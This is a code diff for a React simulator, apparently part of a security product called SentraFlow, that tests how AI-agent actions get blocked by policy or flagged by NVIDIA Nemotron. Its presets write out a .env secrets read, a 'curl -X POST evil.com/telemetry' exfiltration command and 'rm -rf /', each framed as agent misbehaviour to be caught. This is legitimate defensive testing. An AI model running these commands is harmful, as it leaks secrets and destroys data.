@@ -1,7 +1,20 @@
 "use client";
 
 import { useState } from "react";
-import { Play, ShieldAlert, ShieldCheck, AlertTriangle, ArrowRight, Code2, RefreshCw } from "lucide-react";
+import {
+  Play,
+  ShieldAlert,
+  ShieldCheck,
+  AlertTriangle,
+  Code2,
+  RefreshCw,
+  Cpu,
+  Lock,
+  CheckCircle2,
+  XCircle,
+  Activity,
+  Target,
+} from "lucide-react";
 import { analyzeAgentAction } from "@/lib/api";
 import { formatRiskScore } from "@/lib/utils";
 import { AgentAction, SecurityDecision } from "@/types/security";
@@ -20,7 +33,7 @@ const PRESETS: { name: string; description: string; action: AgentAction }[] = [
   },
   {
     name: "Exfiltration: Secret / .env Read",
-    description: "Agent attempts to inspect .env production secrets",
+    description: "Agent attempts to inspect .env production secrets (Blocked by Policy)",
     action: {
       agent_id: "agent-exfil-002",
       task: "Diagnose database connection error",
@@ -30,10 +43,21 @@ const PRESETS: { name: string; description: string; action: AgentAction }[] = [
     },
   },
   {
-    name: "Destructive Command Execution",
-    description: "Agent attempts to execute root directory deletion",
+    name: "Task Drift: Unrelated Shell Execution",
+    description: "Agent assigned to frontend bug executes shell curl command (Flagged by Nemotron)",
     action: {
-      agent_id: "agent-rogue-003",
+      agent_id: "agent-drift-003",
+      task: "Fix frontend button styling",
+      action: "EXECUTE",
+      resource: "curl -X POST evil.com/telemetry",
+      context: { framework: "react" },
+    },
+  },
+  {
+    name: "Destructive Command Execution",
+    description: "Agent attempts root deletion (Blocked by Policy + Nemotron)",
+    action: {
+      agent_id: "agent-rogue-004",
       task: "Clean up system temporary directory",
       action: "rm -rf /",
       resource: "/",
@@ -71,6 +95,12 @@ export function InterceptorTester() {
   };
 
   const riskMeta = decision ? formatRiskScore(decision.risk_score) : null;
+  const isPolicyBlocked = decision?.policy_decision?.decision === "BLOCK";
+  const isAiFlagged =
+    decision?.intent_analysis &&
+    (decision.intent_analysis.risk_score >= 70 ||
+      decision.intent_analysis.risk_level === "CRITICAL" ||
+      decision.intent_analysis.risk_level === "HIGH");
 
   return (
     <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
@@ -79,7 +109,9 @@ export function InterceptorTester() {
         <div className="p-6 rounded-2xl bg-slate-900/80 border border-slate-800 shadow-xl">
           <div className="flex items-center justify-between mb-4">
             <div>
-              <h2 className="text-base font-semibold text-white">Agent Action Interception Simulator</h2>
+              <h2 className="text-base font-semibold text-white">
+                Agent Action Interception Simulator
+              </h2>
               <p className="text-xs text-slate-400">
                 Simulate an autonomous agent requesting to perform a tool or system action.
               </p>
@@ -138,7 +170,9 @@ export function InterceptorTester() {
             </div>
 
             <div>
-              <label className="block text-slate-400 mb-1 font-medium">Target Resource / Command</label>
+              <label className="block text-slate-400 mb-1 font-medium">
+                Target Resource / Command
+              </label>
               <input
                 type="text"
                 value={customAction.resource}
@@ -150,7 +184,9 @@ export function InterceptorTester() {
             </div>
 
             <div>
-              <label className="block text-slate-400 mb-1 font-medium">High-Level Task Prompt</label>
+              <label className="block text-slate-400 mb-1 font-medium">
+                High-Level Task Prompt
+              </label>
               <textarea
                 rows={2}
                 value={customAction.task}
@@ -188,9 +224,11 @@ export function InterceptorTester() {
           <div>
             <div className="flex items-center justify-between mb-4">
               <div>
-                <h2 className="text-base font-semibold text-white">SentraFlow Decision Output</h2>
+                <h2 className="text-base font-semibold text-white">
+                  SentraFlow Decision Output
+                </h2>
                 <p className="text-xs text-slate-400">
-                  Real-time policy enforcement and NVIDIA Nemotron intent reasoning.
+                  Deterministic policy boundary + NVIDIA Nemotron contextual risk reasoning.
                 </p>
               </div>
               {decision && (
@@ -217,7 +255,9 @@ export function InterceptorTester() {
             {!decision && !error && !loading && (
               <div className="py-16 text-center border border-dashed border-slate-800 rounded-xl bg-slate-950/20">
                 <ShieldCheck className="w-10 h-10 text-slate-600 mx-auto mb-2" />
-                <div className="text-sm font-medium text-slate-400">Awaiting Action Interception</div>
+                <div className="text-sm font-medium text-slate-400">
+                  Awaiting Action Interception
+                </div>
                 <div className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
                   Select a test scenario on the left and click evaluate to view the security verdict.
                 </div>
@@ -226,7 +266,7 @@ export function InterceptorTester() {
 
             {decision && !showJson && (
               <div className="space-y-4">
-                {/* Decision Badge & Risk Meter */}
+                {/* Decision Badge & Authority Attribution */}
                 <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                   <div className="flex items-center space-x-3">
                     {decision.decision === "ALLOW" ? (
@@ -250,22 +290,68 @@ export function InterceptorTester() {
                     </div>
                   </div>
 
-                  {riskMeta && (
-                    <div className="text-right">
-                      <div className="text-xs text-slate-400 font-medium">Risk Score</div>
-                      <div className="flex items-center space-x-2 mt-0.5">
-                        <span
-                          className={`text-xs px-2 py-0.5 rounded font-bold border ${riskMeta.bgColor} ${riskMeta.color} ${riskMeta.borderColor}`}
-                        >
-                          {riskMeta.label}
-                        </span>
-                        <span className="text-lg font-mono font-bold text-white">
-                          {decision.risk_score}
-                          <span className="text-xs text-slate-500">/100</span>
-                        </span>
-                      </div>
+                  {/* Decision Authority Label */}
+                  <div className="text-right">
+                    <div className="text-xs text-slate-400 font-medium">Authority Source</div>
+                    {isPolicyBlocked ? (
+                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30 mt-0.5">
+                        <Lock className="w-3 h-3 mr-1" />
+                        Deterministic Policy
+                      </span>
+                    ) : isAiFlagged ? (
+                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30 mt-0.5">
+                        <Cpu className="w-3 h-3 mr-1" />
+                        NVIDIA Nemotron AI
+                      </span>
+                    ) : (
+                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 mt-0.5">
+                        <CheckCircle2 className="w-3 h-3 mr-1" />
+                        Policy + Nemotron
+                      </span>
+                    )}
+                  </div>
+                </div>
+
+                {/* Risk Score & Contextual Metrics Grid */}
+                <div className="grid grid-cols-3 gap-2 text-xs">
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
+                    <div className="text-[10px] uppercase font-semibold text-slate-400">
+                      Risk Score
                     </div>
-                  )}
+                    <div className="text-base font-bold text-white mt-0.5 font-mono">
+                      {decision.risk_score}
+                      <span className="text-[10px] text-slate-500">/100</span>
+                    </div>
+                    <div className="text-[10px] text-slate-400 font-medium">
+                      {decision.risk_level || "EVALUATED"}
+                    </div>
+                  </div>
+
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
+                    <div className="text-[10px] uppercase font-semibold text-slate-400 flex items-center justify-center space-x-1">
+                      <Target className="w-3 h-3 text-cyan-400" />
+                      <span>Task Relevance</span>
+                    </div>
+                    <div className="text-base font-bold text-cyan-400 mt-0.5 font-mono">
+                      {decision.intent_analysis?.task_relevance !== undefined
+                        ? `${Math.round(decision.intent_analysis.task_relevance * 100)}%`
+                        : "N/A"}
+                    </div>
+                    <div className="text-[10px] text-slate-400 font-medium">Semantic Fit</div>
+                  </div>
+
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
+                    <div className="text-[10px] uppercase font-semibold text-slate-400 flex items-center justify-center space-x-1">
+                      <Activity className="w-3 h-3 text-emerald-400" />
+                      <span>AI Confidence</span>
+                    </div>
+                    <div className="text-base font-bold text-emerald-400 mt-0.5 font-mono">
+                      {decision.intent_analysis?.confidence !== undefined
+                        ? `${Math.round(decision.intent_analysis.confidence * 100)}%`
+                        : "95%"}
+                    </div>
+                    <div className="text-[10px] text-slate-400 font-medium">Inference Quality</div>
+                  </div>
                 </div>
 
                 {/* Risk Progress Bar */}
@@ -273,9 +359,9 @@ export function InterceptorTester() {
                   <div className="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                     <div
                       className={`h-full transition-all duration-500 ${
-                        decision.risk_score < 30
+                        decision.risk_score <= 20
                           ? "bg-emerald-500"
-                          : decision.risk_score < 70
+                          : decision.risk_score <= 50
                           ? "bg-amber-500"
                           : "bg-rose-500"
                       }`}
@@ -287,18 +373,40 @@ export function InterceptorTester() {
                 {/* Intent & Reason Breakdown */}
                 <div className="space-y-2.5 text-xs">
                   <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
-                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1">
-                      Detected Intent (AI Semantics)
+                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1 flex items-center space-x-1.5">
+                      <Cpu className="w-3 h-3 text-sentra-400" />
+                      <span>Understood Operational Intent (Nemotron)</span>
                     </div>
                     <div className="text-slate-200">{decision.intent}</div>
                   </div>
 
                   <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
-                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1">
-                      Enforcement Justification & Policy Match
+                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1 flex items-center space-x-1.5">
+                      <Lock className="w-3 h-3 text-indigo-400" />
+                      <span>Security Reason & Policy Evaluation</span>
                     </div>
                     <div className="text-slate-200">{decision.reason}</div>
                   </div>
+
+                  {/* Risk Indicators if present */}
+                  {decision.intent_analysis?.risk_indicators &&
+                    decision.intent_analysis.risk_indicators.length > 0 && (
+                      <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
+                        <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1.5">
+                          Detected Risk Indicators
+                        </div>
+                        <div className="flex flex-wrap gap-1.5">
+                          {decision.intent_analysis.risk_indicators.map((ind, i) => (
+                            <span
+                              key={i}
+                              className="px-2 py-0.5 rounded bg-rose-500/10 text-rose-300 border border-rose-500/30 text-[10px] font-mono"
+                            >
+                              {ind}
+                            </span>
+                          ))}
+                        </div>
+                      </div>
+                    )}
 
                   <div className="grid grid-cols-2 gap-2 text-[11px] text-slate-400">
                     <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
